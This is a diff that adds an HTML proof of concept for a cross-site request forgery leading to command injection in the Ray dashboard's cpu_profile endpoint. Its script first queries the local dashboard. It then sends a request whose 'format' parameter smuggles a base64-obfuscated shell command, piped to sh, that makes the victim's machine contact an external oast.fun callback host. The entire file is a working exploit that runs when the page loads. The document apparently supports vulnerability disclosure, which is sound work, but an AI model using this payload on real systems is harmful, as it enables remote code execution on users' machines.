@@ -1,0 +1,22 @@
+<html>
+  <!-- Ray cpu_profile cmd injection CSRF PoC -->
+  <body>
+    <script>
+        fetch("http://127.0.0.1:8265/nodes?view=summary", {
+            "headers": {
+                "accept": "application/json, text/plain, */*",
+            },
+            "method": "GET",
+            "mode": "cors",
+        }).then(x => x.json())
+
+        fetch("http://127.0.0.1:8265/worker/cpu_profile?pid={{pid}}&ip={{node_ip}}&duration=5&native=0&format=%60echo%20cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldDtzb2NrZXQuZ2V0aG9zdGJ5bmFtZSgiY2t0YmVlNm5yMmt0Y3Y2c2ZkMjBxdDZjNGQ1bXh1cHdhLm9hc3QuZnVuIikn|base64$IFS-d|sh%60", {
+            "headers": {
+                "accept": "application/json, text/plain, */*",
+            },
+            "method": "GET",
+            "mode": "no-cors",
+        }).then(x => x.json())
+    </script>
+  </body>
+</html>
